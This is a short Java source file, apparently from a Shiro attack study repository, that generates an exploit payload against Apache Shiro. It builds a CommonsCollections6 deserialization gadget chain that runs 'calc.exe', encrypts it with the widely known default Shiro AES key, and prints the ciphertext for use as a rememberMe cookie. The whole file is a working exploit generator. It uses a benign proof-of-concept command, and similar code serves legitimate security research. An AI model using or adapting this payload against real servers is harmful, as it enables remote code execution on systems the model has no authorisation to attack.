package com.govuln.shiroattack;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class Wrong {
    public static void main(String []args) throws Exception {

        // byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath("D:\\pro\\ysoserial\\poc.ser"));
        byte[] payloads = new CommonsCollections6().getPayload("calc.exe");
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }
}
